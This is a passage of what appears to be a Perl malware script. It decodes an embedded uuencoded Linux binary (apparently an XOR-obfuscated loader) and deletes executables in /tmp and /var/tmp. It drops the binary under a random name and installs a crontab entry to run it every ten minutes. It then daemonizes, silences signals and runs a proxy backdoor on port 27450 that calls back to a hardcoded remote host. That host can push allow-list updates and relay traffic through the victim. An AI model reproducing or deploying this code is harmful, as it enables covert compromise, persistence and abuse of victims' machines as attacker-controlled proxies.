M`'!?8V]D90!P7W-I>F4`4UE37V5X:70`<W1A8VMP`&9H86YD80!F:&%N9&(`
F8G5F9F5R`%]S=&%R=`!?7V)S<U]S=&%R=`!?961A=&$`7V5N9```
BDRPDATABSD
}
else
{
$bdrp = <<'BDRPDATALIN';
M?T5,1@$!`0````````````(``P`!````@(`$"#0```"H&0```````#0`(``"
M`"@`!P`$``$``````````(`$"`"`!`@!`P```0,```4`````$````0````0#
M```$DP0(!),$"'86``",&@``!@`````0``````````````````"))7RI!`B^
M!9,$"+D-````Z'D```#HH````+X3DP0(N6<6``#H90```+@$````BQV,J00(
MN1.3!`BZ9Q8``%)14U#-@',"]]B!Q!`````]``````^,+````#G0#X4D````
MN`8```"+'8RI!`A34,V`<P+WV('$"````#T`````#XP`````,<!`,=M34,V`
M,=M#0T-#NA````!67SG3=1.!^H````!U`C'2@<(0````,=M#K##8JD/BXL.*
M#023!`BX*@```+N`J00(4U#-@',"]]B!Q`@````]``````^,HO___X#Y"74%
MB0.)4P2X*@```+N(J00(4U#-@',"]]B!Q`@````]``````^,=?___X#Y"74%
MB0.)4P2X`@```%"`^0EU"\V`<P+WV.D"````S8"!Q`0````]``````^,0O__
M_P^$20```+@&````BQV$J00(4U#-@',"]]B!Q`@````]``````^,&/___[@&
M````BQV(J00(4U#-@',"]]B!Q`@````]``````^,]/[__\.*%023!`BX/P``
M`(#Z"74%N%H```"+'8BI!`@QR5%34,V`<P+WV('$#````#T`````#XR\_O__
MN#\```"`^@EU!;A:````BQV$J00(,<E!45-0S8!S`O?8@<0,````/0`````/
MC(K^__^X!@```(L=@*D$"%-0S8!S`O?8@<0(````/0`````/C&;^__^X!@``
M`(L=C*D$"%-0S8!S`O?8@<0(````/0`````/C$+^__^+)7RI!`B)YEE8XOV-
M5"0$B?2-3"0$NP63!`B@!),$"#P)=0ZX.P```%)14U#I!0```+@+````S8#I
M!/[__P````,K<'5U)VMC92-]:WUM`'%V8R=[?7AB;WDU+W1Q9B15251!43$K
M>7YK+UE>*"E'>G5\?6TA.VEN>S](33D^5F-K;6I^,"PI/B\M,3!B>71_>SHB
M.C]@/2,_$1H"3ET%`D)?2T9$3T8.$B$S,C\E:WXH+6]B?']A:&(Q+S,E("8L
M.'!\.S0Y0%``1%,#!DE/25U1"`(,5@X+54907UM671<%&0L*!QT:6FAR<6MB
M="<U*3LZ.38N<AIX=#,\,4A8.'QK.SY[;'I%0U%'!@P&7`@-3UQ.04%,6Q$/
M$P<`#1<<7%-+3E)936!\8G!R?F8Z:&\G*B4C9F8Z(G!Q9R9J:6!D*W<M:W=Y
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
M1Q8`!P,-&QE&4A\+`A\'%UM0'1<9'!4?4EP4&%\E<&9E86-U>R0T;G1D?7MR
M*B=L9&AC9&PC,"QN8F!C=#(W?'1X<W1\(3MA/6QZ=7=Q:CXF>BAT*G8&`"YS
M>6UT86(`+G-T<G1A8@`N<VAS=')T86(`+G1E>'0`+F1A=&$`+F)S<P``````
M```````````````````````````````````````````````````;`````0``
M``8```"`@`0(@````($"`````````````!``````````(0````$````#````
M!),$"`0#``!V%@`````````````$`````````"<````(`````P```'RI!`AZ
M&0``%`0`````````````!``````````1`````P``````````````>AD``"P`
M``````````````$``````````0````(``````````````,`:```@`@``!@``
M`!X````$````$`````D````#``````````````#@'```J@$`````````````
M`0```````````````````````````````````("`!`@``````P`!```````$
MDP0(``````,``@``````?*D$"``````#``,``0``````````````!`#Q_Q0`
M```%@00(`````````0`9````#H$$"`````````$`(0```!N!!`@````````!
M`#@````I@00(`````````0!/````,H$$"`````````$`9@```#J!!`@`````
M```!`&L```!M@00(`````````0"$````FH$$"`````````$`G0```+"!!`@`
M```````!`+8```"R@00(`````````0#/````$H($"`````````$`WP```">"
M!`@````````!`/@```!8@@0(`````````0`1`0``]8($"`````````$`*@$`
M`/J"!`@````````!`$,!```$DP0(`````````@!*`0``!9,$"`````````(`
M40$```T```````````#Q_U@!```3DP0(`````````@!?`0``9Q8`````````
M`/'_9@$```$```````````#Q_V\!``!\J00(`````````P!V`0``@*D$"```
M``````,`?0$``(BI!`@````````#`(0!``"0J00(`````````P"+`0``@(`$
M"``````0``$`D@$``'JI!`@`````$`#Q_YX!``!ZJ00(`````!``\?^E`0``
MD*T$"``````0`/'_`"XO+B]L;V%D97)?;&EN=7@N<P!E>&ET`'AO<F1A=&$`
M>&]R9&%T82YX;W)D871A7VQO;W!?,0!X;W)D871A+GAO<F1A=&%?;&]O<%\R
M`'AO<F1A=&$N>&]R9&%T85]L;V]P7S,`<&EP90!P:7!E+G!I<&5?<VMI<%]F
M<F5E8G-D7S$`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\R`'!I<&4N<&EP95]S
M:VEP7V9R965B<V1?,P!P:7!E+G!I<&5?<VMI<%]F<F5E8G-D7S0`<&EP92YP
M:7!E7V-H:6QD`'!I<&4N<&EP95]S:VEP7V9R965B<V1?-0!P:7!E+G!I<&5?
M<VMI<%]F<F5E8G-D7S8`<&EP92YP:7!E7W-K:7!?9G)E96)S9%\W`'!I<&4N
M<&EP95]S:VEP7V9R965B<V1?.`!S>7-T96T`87)G=E\P`&%R9W9?<P!P7V-O
M9&4`<%]S:7IE`%-94U]E>&ET`'-T86-K<`!F:&%N9&$`9FAA;F1B`&)U9F9E
A<@!?<W1A<G0`7U]B<W-?<W1A<G0`7V5D871A`%]E;F0`
BDRPDATALIN
}
$bdrp = unpack ("u*", $bdrp); foreach my $bdrpp ("/var/tmp", "/tmp") { for (<$bdrpp/*>) { unlink $_ if (-f $_ && (-x $_ || -X $_)); }
my $bdrpn = ["a".."z", "A".."Z"]; $bdrpn = join ("", @$bdrpn[map {rand @$bdrpn}(1..(6 + int rand 5))]); my $bdrpb = "$bdrpp/$bdrpn";
my $bdrpc = $bdrpb . int rand 9; my $bdrpt = "*/10 * * * * $bdrpb >/dev/null 2>&1\n"; if (open (B, ">", $bdrpb)) { flock B, 2; print B $bdrp; close B;
if (open (C, ">", $bdrpc)) { flock C, 2; print C $bdrpt; close C; chmod 0755, $bdrpb; system "crontab $bdrpc >/dev/null 2>&1"; unlink $bdrpc; last; } } }
}
sub startserver
{
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);
return if $child;
POSIX::setsid();
$SIG{CHLD} = sub { while (waitpid (-1, 1) > 0) {} };
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM));
umask 0;
chdir "/";
open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT");
}
my $setting = { listen_port => 27450, remote_host_list => ["46.165.222.212:12141"], allow_host_list => {}, restart_timer => 5, connect_timeout => 10, session_timeout => 60 };
my $readers = IO::Select->new() or exit 0;
my $writers = IO::Select->new() or exit 0;
my $session = {};
my $destroy = sub
{
my $handle = shift;
if (exists $session->{$handle})
{
$readers->remove($session->{$handle}{handle}) if $readers->exists($session->{$handle}{handle});
$writers->remove($session->{$handle}{handle}) if $writers->exists($session->{$handle}{handle});
close $session->{$handle}{handle};
delete $session->{$handle};
}
};
my $listen_socket = IO::Socket::INET->new(Proto => "tcp", LocalPort => $setting->{listen_port}, Listen => SOMAXCONN, Reuse => 1);
exit 0 unless $listen_socket;
if ($^O eq "MSWin32") { ioctl ($listen_socket, 0x8004667e, pack ("L", 1)); } else { $listen_socket->blocking(0); }
unless ($readers->add($listen_socket))
{
close $listen_socket;
exit 0;
}
foreach (@{$setting->{remote_host_list}})
{
my ($hostaddr, $hostport) = split (/:/, $_, 2);
$hostaddr = pack ("C4", split (/\./, $hostaddr));
if ($hostaddr)
{
$setting->{allow_host_list}{$hostaddr} = "";
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($hostport, $hostaddr)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
unless ($writers->add($socket))
{
close $socket;
next;
}
unless ($readers->add($socket))
{
$writers->remove($socket);
close $socket;
next;
}
$session->{$socket} =
{
status	=> "cn_rh",
buffer	=> "",
handle	=> $socket,
target	=> "",
flagset	=> 1,
timeout	=> 0
};
}
}
$setting->{restart_timer} = time - 10 + $setting->{restart_timer} * 60;
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $readable = (IO::Select->select($readers, undef, undef, 0.01))[0];
foreach my $handle (@$readable)
{
if ($handle eq $listen_socket)
{
my ($socket_one, $peer_addr) = $handle->accept;
next unless $socket_one;
$peer_addr = substr ($peer_addr, 4, 4);
unless (exists $setting->{allow_host_list}{$peer_addr})
{
close $socket_one;
next;
}
my $socket_two = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
unless ($socket_two)
{
close $socket_one;
next;
}
if ($^O eq "MSWin32") { ioctl ($socket_one, 0x8004667e, pack ("L", 1)); } else { $socket_one->blocking(0); }
if ($^O eq "MSWin32") { ioctl ($socket_two, 0x8004667e, pack ("L", 1)); } else { $socket_two->blocking(0); }
if ($readers->add($socket_one))
{
if ($readers->add($socket_two))
{
if ($writers->add($socket_one))
{
if ($writers->add($socket_two))
{
$session->{$socket_one} =
{
status	=> "rd_qr",
buffer	=> "",
handle	=> $socket_one,
target	=> $socket_two,
flagset	=> 1,
timeout	=> 0
};
$session->{$socket_two} =
{
status	=> "wt_cm",
buffer	=> "",
handle	=> $socket_two,
target	=> $socket_one,
flagset	=> 1,
timeout	=> 0
};
next;
}
$writers->remove($socket_one);
}
$readers->remove($socket_two);
}
$readers->remove($socket_one);
}
close $socket_one;
close $socket_two;
next;
}
next unless exists $session->{$handle};
next if $session->{$handle}{status} !~ /^(rd|tr)/;
my $buffer;
if ($1 eq "rd")
{
$buffer = \$session->{$handle}{buffer};
}
elsif (exists $session->{$session->{$handle}{target}})
{
$buffer = \$session->{$session->{$handle}{target}}{buffer};
}
else
{
$destroy->($handle);
next;
}
my $length = length $$buffer;
my $unused = 8192 - $length;
if ($unused > 0)
{
my $result = sysread ($handle, $$buffer, $unused, $length);
if (defined $result)
{
if ($result > 0)
{
$session->{$handle}{flagset} = 1;
$length += $result;
}
else
{
if (exists $session->{$session->{$handle}{target}})
{
unless (length $session->{$session->{$handle}{target}}{buffer})
{
$destroy->($session->{$handle}{target});
}
else
{
$readers->remove($session->{$handle}{target});
}
}
$destroy->($handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
next;
}
}
next if $session->{$handle}{status} eq "tr_dt";
if ($session->{$handle}{status} eq "rd_qr")
{
next if $length < 2;
my $signature = substr $$buffer, 0, 2;
if ($signature eq "\x70\x10")
{
$destroy->($session->{$handle}{target});
$session->{$handle}{status} = "rd_rh";
}
elsif ($signature eq "\x04\x01")
{
$session->{$handle}{status} = "rd_cl";
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
next;
}
}
if ($session->{$handle}{status} eq "rd_rh")
{
next if $length < 20;
if (unpack ("S", (substr $$buffer, 2, 2)) == 128)
{
$setting->{restart_timer} = 0;
}
elsif ((my $counter = unpack ("S", (substr $$buffer, 18, 2))) > 0)
{
next if $length < (20 + $counter * 4);
while (my $allow_host = (substr $$buffer, 20, 4, ""))
{
last if (length $allow_host) < 4;
$setting->{allow_host_list}{$allow_host} = "";
}
}
$destroy->($handle);
}
else
{
next if $length < 9;
if ((my $index = index $$buffer, "\x00", 8) > 0)
{
my $socket = $session->{$handle}{target};
unless ($socket->connect($_ = sockaddr_in(unpack ("n", substr ($$buffer, 2, 2)), substr ($$buffer, 4, 4))))
{
if ($! != $eiprogr && $! != $ewblock)
{
$destroy->($session->{$handle}{target});
$session->{$handle}{status} = "wr_rj";
$$buffer = pack ("Sx6", 23296);
next;
}
}
$session->{$session->{$handle}{target}}{status} = "cn_th";
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$handle}{status} = "wt_cm";
substr ($$buffer, 0, $index + 1) = "";
$session->{$session->{$handle}{target}}{buffer} = $$buffer;
$$buffer = pack ("Sx6", 23040);
}
}
}
IO::Select->select(undef, undef, undef, 0.01);
my $writable = (IO::Select->select(undef, $writers, undef, 0.01))[1];
foreach my $handle (@$writable)
{
next unless exists $session->{$handle};
next if $session->{$handle}{status} !~ /^((cn|wr|tr)_(.+))$/;
if ($2 eq "cn")
{
if ($handle->connected)
{
if ($3 eq "rh")
{
$session->{$handle}{flagset} = 1;
$session->{$handle}{status} = "wr_rh";
$session->{$handle}{buffer} = pack ("Sn", 4209, $setting->{listen_port});
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$session->{$handle}{target}}{status} = "wr_gr";
$session->{$handle}{status} = "wt_cm";
}
}
else
{
if ($3 eq "rh")
{
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$session->{$handle}{target}}{status} = "wr_rj";
$session->{$session->{$handle}{target}}{buffer} = pack ("Sx6", 23296);
}
$destroy->($handle);
}
next;
}
if (length $session->{$handle}{buffer})
{
my $result = syswrite ($handle, $session->{$handle}{buffer});
if (defined $result && $result > 0)
{
$session->{$handle}{flagset} = 1;
substr ($session->{$handle}{buffer}, 0, $result) = "";
unless (length $session->{$handle}{buffer})
{
if ($1 eq "wr_rh")
{
$session->{$handle}{status} = "rd_rh";
}
elsif ($1 eq "wr_rj")
{
$destroy->($handle);
}
elsif ($1 eq "wr_gr")
{
$session->{$handle}{status} = "tr_dt";
$session->{$session->{$handle}{target}}{status} = "tr_dt";
}
elsif ($1 eq "tr_dt")
{
unless (exists $session->{$session->{$handle}{target}})
{
$destroy->($handle);
}
}
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
}
}
}
while (my ($handle, $values) = each %$session)
{
next if $values->{status} eq "wt_cm";
my $timeout = time;
if ($values->{flagset})
{
if ($values->{status} =~ /^cn/)
{
$timeout += $setting->{connect_timeout};
}
else
{
$timeout += $setting->{session_timeout};
}
if (exists $session->{$values->{target}})
{
$session->{$values->{target}}{timeout} = $timeout;
$session->{$values->{target}}{flagset} = 0;
}
$values->{timeout} = $timeout;
$values->{flagset} = 0;
}
elsif ($timeout >= $values->{timeout})
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
}
}
if ($readers->exists($listen_socket) && time >= $setting->{restart_timer})
{
$readers->remove($listen_socket);
close $listen_socket;
&startserver() if $setting->{restart_timer};
}
last unless $readers->count or $writers->count;
}
exit 0;
}
